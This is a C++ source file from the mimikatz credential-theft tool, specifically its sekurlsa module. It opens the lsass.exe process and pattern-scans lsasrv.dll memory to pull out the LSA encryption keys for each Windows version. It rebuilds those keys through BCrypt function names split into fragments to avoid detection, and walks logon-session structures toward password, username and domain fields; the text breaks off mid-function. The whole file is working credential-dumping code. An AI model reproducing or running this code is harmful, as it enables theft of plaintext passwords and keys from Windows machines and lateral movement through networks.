/*	Benjamin DELPY `gentilkiwi`
http://blog.gentilkiwi.com
benjamin@gentilkiwi.com
Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "mod_mimikatz_sekurlsa.h"
HMODULE mod_mimikatz_sekurlsa::hLsaSrv = NULL, mod_mimikatz_sekurlsa::hBCrypt = NULL;
HANDLE mod_mimikatz_sekurlsa::hLSASS = NULL;
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa::pModLSASRV = NULL;
PLSA_SECPKG_FUNCTION_TABLE mod_mimikatz_sekurlsa::SeckPkgFunctionTable = NULL;
PBYTE * mod_mimikatz_sekurlsa::g_pRandomKey = NULL, * mod_mimikatz_sekurlsa::g_pDESXKey = NULL, mod_mimikatz_sekurlsa::AESKey = NULL, mod_mimikatz_sekurlsa::DES3Key = NULL;
mod_mimikatz_sekurlsa::PKIWI_BCRYPT_KEY * mod_mimikatz_sekurlsa::hAesKey = NULL, * mod_mimikatz_sekurlsa::h3DesKey = NULL;
BCRYPT_ALG_HANDLE * mod_mimikatz_sekurlsa::hAesProvider = NULL, * mod_mimikatz_sekurlsa::h3DesProvider = NULL;
bool mod_mimikatz_sekurlsa::population = false;
vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> mod_mimikatz_sekurlsa::GLOB_ALL_Providers;

#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3};
LONG OFFS_WNT5_g_pRandomKey							= -(6 + 2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pRandomKey - (3 + sizeof(long));
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_cbRandomKey - (2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_Feedback							= OFFS_WNT5_g_pDESXKey - (3 + 7 + 6 + 2 + 5 + 5 + sizeof(long));

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D};
LONG OFFS_WNO8_hAesKey								= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3;
LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D};
LONG OFFS_WIN8_hAesKey								= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3;
LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;
#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xC0, 0x74, 0x44, 0x6A, 0x08, 0x68};
LONG OFFS_WNT5_g_Feedback							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_g_pRandomKey							= OFFS_WNT5_g_Feedback	+ sizeof(long) + 5 + 2 + 2 + 2;
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_pRandomKey+ sizeof(long) + 2;
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pDESXKey	+ sizeof(long) + 5 + 2;

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WNO8_hAesKey								= -(5 + 6 + sizeof(long));
LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long));
LONG OFFS_WNO8_InitializationVector					= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WIN8_hAesKey								= -(2 + 6 + sizeof(long));
LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
#endif

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_msv1_0::getMSV,		L"msv",		L"lists the current sessions of the provider MSV1_0"));
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_wdigest::getWDigest,	L"wdigest",	L"lists the current sessions of the provider WDigest"));
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"lists the current sessions of the provider Kerberos"));
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"lists the current sessions of the provider TsPkg"));
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"lists the current sessions of the provider LiveSSP"));
//	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_ssp::getSSP,	L"ssp",	L"lists the current sessions of the provider SSP (msv1_0)"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"lists the current sessions of the available provider(s)"));
	return monVector;
}

bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
{
	if(searchLSASSDatas())
		getLogonData(arguments, &GLOB_ALL_Providers);
	else
		wcout << L"LSASS error in data" << endl;
	return true;
}

bool mod_mimikatz_sekurlsa::loadLsaSrv()
{
	if((mod_system::GLOB_Version.dwMajorVersion > 5) && !hBCrypt)
		hBCrypt = LoadLibrary(L"bcrypt");
	if(!hLsaSrv)
		hLsaSrv = LoadLibrary(L"lsasrv");
	return (hLsaSrv != NULL);
}

bool mod_mimikatz_sekurlsa::unloadLsaSrv()
{
	if(pModLSASRV)
		delete pModLSASRV;
	if(mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
		delete mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
	if(mod_mimikatz_sekurlsa_livessp::pModLIVESSP)
		delete mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
	if(mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
		delete mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
	if(mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
		delete mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
	if(mod_mimikatz_sekurlsa_ssp::pModMSV)
		delete mod_mimikatz_sekurlsa_ssp::pModMSV;

	if(g_pRandomKey)
		if(*g_pRandomKey)
			delete[] *g_pRandomKey;
	if(g_pDESXKey)
		if(*g_pDESXKey)
			delete[] *g_pDESXKey;

	LsaCleanupProtectedMemory_NT6();

	if(hLSASS)
		CloseHandle(hLSASS);
	if(hLsaSrv)
		FreeLibrary(hLsaSrv);
	if(hBCrypt)
		FreeLibrary(hBCrypt);

	return true;
}

bool mod_mimikatz_sekurlsa::searchLSASSDatas()
{
	if(!population)
	{
		if(!hLSASS)
		{
			mod_process::KIWI_PROCESSENTRY32 monProcess;
			wstring processName = L"lsass.exe";
			if(mod_process::getUniqueForName(&monProcess, &processName))
			{
				if(hLSASS = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, monProcess.th32ProcessID))
				{
					vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY> monVecteurModules;

					if(mod_process::getVeryBasicModulesListForProcess(&monVecteurModules, hLSASS))
					{
						for(vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY>::iterator leModule = monVecteurModules.begin(); leModule != monVecteurModules.end(); leModule++)
						{	
							mod_process::PKIWI_VERY_BASIC_MODULEENTRY * lePointeur = NULL;
							
							GetModuleHandle(NULL);
							if((_wcsicmp(leModule->szModule.c_str(), L"lsasrv.dll") == 0) && !pModLSASRV)
							{
								GetModuleHandle(NULL);
								lePointeur = &pModLSASRV;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData, wstring(L"msv1_0")));
								GetVersion();
							}
							else if((_wcsicmp(leModule->szModule.c_str(), L"tspkg.dll") == 0) && !mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
							{
								lePointeur = &mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData, wstring(L"tspkg")));
							}
							else if((_wcsicmp(leModule->szModule.c_str(), L"wdigest.dll") == 0) && !mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
							{
								lePointeur = &mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
							}
							else if((_wcsicmp(leModule->szModule.c_str(), L"livessp.dll") == 0) && !mod_mimikatz_sekurlsa_livessp::pModLIVESSP && (mod_system::GLOB_Version.dwBuildNumber >= 8000))
							{
								lePointeur = &mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData, wstring(L"livessp")));
							}
							else if((_wcsicmp(leModule->szModule.c_str(), L"kerberos.dll") == 0) && !mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
							{
								lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
							}
							else if((_wcsicmp(leModule->szModule.c_str(), L"msv1_0.dll") == 0) && !mod_mimikatz_sekurlsa_ssp::pModMSV)
							{
								lePointeur = &mod_mimikatz_sekurlsa_ssp::pModMSV;
								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_ssp::getSSPLogonData, wstring(L"ssp")));
							}
							if(lePointeur)
								*lePointeur = new mod_process::KIWI_VERY_BASIC_MODULEENTRY(*leModule);
						}
					} else {
						//wcout << L"mod_process::getVeryBasicModulesListForProcess : " << mod_system::getWinError() << endl;
						CloseHandle(hLSASS);
						hLSASS = NULL;
					}
				}// else wcout << L"OpenProcess : " << mod_system::getWinError() << endl;
			}// else wcout << L"mod_process::getUniqueForName : " << mod_system::getWinError() << endl;
		}

		if(hLSASS)
		{
			MODULEINFO mesInfos;
			if(GetVersion() && (GetModuleInformation(GetCurrentProcess(), hLsaSrv, &mesInfos, sizeof(MODULEINFO))))
			{
				GetModuleHandle(NULL);

				PBYTE addrMonModule = reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
				if(!SeckPkgFunctionTable)
				{
					struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsaSrv, "LsaIRegisterNotification"), GetProcAddress(hLsaSrv, "LsaICancelNotification")};
					if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
						mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
				}

				PBYTE ptrBase = NULL;
				DWORD mesSucces = 0;
				if(mod_system::GLOB_Version.dwMajorVersion < 6)
				{
					if(mod_memory::searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &ptrBase, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)))
					{
#ifdef _M_X64
						PBYTE g_Feedback		= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT5_g_Feedback) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_Feedback));
						g_pRandomKey			= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pRandomKey));
						g_pDESXKey				= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pDESXKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pDESXKey));
						PDWORD g_cbRandomKey	= reinterpret_cast<PDWORD >((ptrBase + OFFS_WNT5_g_cbRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_cbRandomKey));
#elif defined _M_IX86
						PBYTE g_Feedback		= *reinterpret_cast<PBYTE  *>(ptrBase + OFFS_WNT5_g_Feedback);
						g_pRandomKey			= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pRandomKey);
						g_pDESXKey				= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pDESXKey);
						PDWORD g_cbRandomKey	= *reinterpret_cast<PDWORD *>(ptrBase + OFFS_WNT5_g_cbRandomKey);
#endif
						*g_Feedback = NULL; *g_pRandomKey = NULL; *g_pDESXKey = NULL; *g_cbRandomKey = NULL;
						mesSucces = 0;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (g_Feedback - addrMonModule), g_Feedback, 8, hLSASS))
							mesSucces++;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_cbRandomKey) - addrMonModule), g_cbRandomKey, sizeof(DWORD), hLSASS))
							mesSucces++;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pRandomKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
						{
							mesSucces++;
							*g_pRandomKey = new BYTE[*g_cbRandomKey];
							if(mod_memory::readMemory(ptrBase, *g_pRandomKey, *g_cbRandomKey, hLSASS))
								mesSucces++;
						}
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr+ (reinterpret_cast<PBYTE>(g_pDESXKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
						{
							mesSucces++;
							*g_pDESXKey = new BYTE[144];
							if(mod_memory::readMemory(ptrBase, *g_pDESXKey, 144, hLSASS))
								mesSucces++;
						}
					}
					else wcout << L"mod_memory::searchMemory NT5 " << mod_system::getWinError() << endl; 
					population = (mesSucces == 6);
				}
				else
				{
					PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
					ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
					LONG OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey, OFFS_WNT6_InitializationVector;
					if(mod_system::GLOB_Version.dwBuildNumber < 8000)
					{
						PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
						OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
#ifdef _M_X64
						if(mod_system::GLOB_Version.dwMinorVersion < 1)
						{
							OFFS_WNT6_h3DesKey = OFFS_WN60_h3DesKey;
							OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
						}
						else
						{
							OFFS_WNT6_h3DesKey = OFFS_WN61_h3DesKey;
							OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
						}
#elif defined _M_IX86
						OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
						OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
#endif
					}
					else
					{
						PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
						OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
						OFFS_WNT6_h3DesKey = OFFS_WIN8_h3DesKey;
						OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
					}
					if(mod_memory::searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
					{
#ifdef _M_X64
						LONG OFFS_WNT6_AdjustProvider = (mod_system::GLOB_Version.dwBuildNumber < 8000) ? 5 : 4;
						PBYTE	InitializationVector	= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
						hAesKey			= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
						h3DesKey		= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_h3DesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey));
						hAesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
						h3DesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
#elif defined _M_IX86
						PBYTE	InitializationVector	= *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
						hAesKey			= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
						h3DesKey		= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_h3DesKey);
						hAesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_hAesKey + sizeof(PVOID) + 2);
						h3DesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_h3DesKey + sizeof(PVOID) + 2);
#endif
						
						if(LsaInitializeProtectedMemory_NT6())
						{
							mesSucces = 0;
							if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (InitializationVector - addrMonModule), InitializationVector, 16, hLSASS))
								mesSucces++;

							KIWI_BCRYPT_KEY maCle;
							KIWI_BCRYPT_KEY_DATA maCleData;

							if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
								if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
									if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
										if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), hLSASS)) // 2 pointeurs internes à la fin, la structure de départ n'était pas inutile ;)
											mesSucces++;

							if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
								if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
									if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
										if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), hLSASS))
											mesSucces++;
						}
						else wcout << L"LsaInitializeProtectedMemory NT6 KO " << endl;
					}
					else wcout << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 
					population = (mesSucces == 3);
				}
			}
		}
	}
	return population;
}

BYTE kiwiRandom3DES[24], kiwiRandomAES[16];

bool mod_mimikatz_sekurlsa::LsaInitializeProtectedMemory_NT6()
{
	bool resultat = false;
	
	char szProcNameBuffer[100];

	lstrcpyA(szProcNameBuffer, "BCryptOp");
	lstrcatA(szProcNameBuffer, "enAlgorithmProvider");

	PBCRYPT_OPEN_ALGORITHM_PROVIDER K_BCryptOpenAlgorithmProvider = reinterpret_cast<PBCRYPT_OPEN_ALGORITHM_PROVIDER>(GetProcAddress(hBCrypt, szProcNameBuffer)); // "BCryptOpenAlgorithmProvider"
	
	lstrcpyA(szProcNameBuffer, "BCry");
	lstrcatA(szProcNameBuffer, "ptSetProperty");
	
	PBCRYPT_SET_PROPERTY K_BCryptSetProperty = reinterpret_cast<PBCRYPT_SET_PROPERTY>(GetProcAddress(hBCrypt, szProcNameBuffer)); // "BCryptSetProperty"

	lstrcpyA(szProcNameBuffer, "BCryptG");
	lstrcatA(szProcNameBuffer, "etProperty");

	PBCRYPT_GET_PROPERTY K_BCryptGetProperty = reinterpret_cast<PBCRYPT_GET_PROPERTY>(GetProcAddress(hBCrypt, szProcNameBuffer)); // "BCryptGetProperty"

	lstrcpyA(szProcNameBuffer, "BCryptGenera");
	lstrcatA(szProcNameBuffer, "teSymmetricKey");

	PBCRYPT_GENERATE_SYMMETRIC_KEY K_BCryptGenerateSymmetricKey = reinterpret_cast<PBCRYPT_GENERATE_SYMMETRIC_KEY>(GetProcAddress(hBCrypt, szProcNameBuffer)); // "BCryptGenerateSymmetricKey"

	if(NT_SUCCESS(K_BCryptOpenAlgorithmProvider(h3DesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0)) && 
		NT_SUCCESS(K_BCryptOpenAlgorithmProvider(hAesProvider, BCRYPT_AES_ALGORITHM, NULL, 0)))
	{
		if(NT_SUCCESS(K_BCryptSetProperty(*h3DesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CBC), sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) &&
			NT_SUCCESS(K_BCryptSetProperty(*hAesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CFB), sizeof(BCRYPT_CHAIN_MODE_CFB), 0)))
		{
			DWORD DES3KeyLen, AESKeyLen, cbLen;

			if(NT_SUCCESS(K_BCryptGetProperty(*h3DesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&DES3KeyLen), sizeof(DES3KeyLen), &cbLen, 0)) &&
				NT_SUCCESS(K_BCryptGetProperty(*hAesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&AESKeyLen), sizeof(AESKeyLen), &cbLen, 0)))
			{

				DES3Key = new BYTE[DES3KeyLen];
				AESKey = new BYTE[AESKeyLen];

				resultat = NT_SUCCESS(K_BCryptGenerateSymmetricKey(*h3DesProvider, (BCRYPT_KEY_HANDLE *) h3DesKey, DES3Key, DES3KeyLen, kiwiRandom3DES, sizeof(kiwiRandom3DES), 0)) &&
					NT_SUCCESS(K_BCryptGenerateSymmetricKey(*hAesProvider, (BCRYPT_KEY_HANDLE *) hAesKey, AESKey, AESKeyLen, kiwiRandomAES, sizeof(kiwiRandomAES), 0));
			}
		}
	}
	return resultat;
}

bool mod_mimikatz_sekurlsa::LsaCleanupProtectedMemory_NT6()
{
	PBCRYTP_DESTROY_KEY K_BCryptDestroyKey = reinterpret_cast<PBCRYTP_DESTROY_KEY>(GetProcAddress(hBCrypt, "BCryptDestroyKey"));
	PBCRYTP_CLOSE_ALGORITHM_PROVIDER K_BCryptCloseAlgorithmProvider = reinterpret_cast<PBCRYTP_CLOSE_ALGORITHM_PROVIDER>(GetProcAddress(hBCrypt, "BCryptCloseAlgorithmProvider"));

	if (h3DesKey )
		K_BCryptDestroyKey(*h3DesKey);
	if (hAesKey )
		K_BCryptDestroyKey(*hAesKey);

	if (h3DesProvider)
		K_BCryptCloseAlgorithmProvider(*h3DesProvider, 0);
	if (hAesProvider )
		K_BCryptCloseAlgorithmProvider(*hAesProvider, 0);

	if(DES3Key)
		delete[] DES3Key;
	if(AESKey)
		delete[] AESKey;

	return true;
}

PLIST_ENTRY mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
	PLIST_ENTRY pStruct = NULL;
	if(mod_memory::readMemory(pSecurityStruct, &pStruct, sizeof(pStruct), hLSASS))
	{
		while(pStruct != pSecurityStruct)
		{
			if(mod_memory::readMemory(pStruct, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
				{
					resultat = pStruct;
					break;
				}
			} else break;
			pStruct = reinterpret_cast<PLIST_ENTRY>(monBuffer)->Flink;
		}
	}
	delete [] monBuffer;
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
		resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
	{
		if(maTable.OrderedPointer)
		{
			BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
			if(mod_memory::readMemory(maTable.OrderedPointer, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
					resultat = maTable.OrderedPointer;
			}
			delete [] monBuffer;
		}

		if(!resultat && maTable.BalancedRoot.LeftChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.LeftChild), LUIDoffset, luidToFind);
		if(!resultat && maTable.BalancedRoot.RightChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	}
	return resultat;
}

void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst, PDWORD pos)
{
	if(mesCreds)
	{
		if(mesCreds->Password.Buffer || mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer)
		{
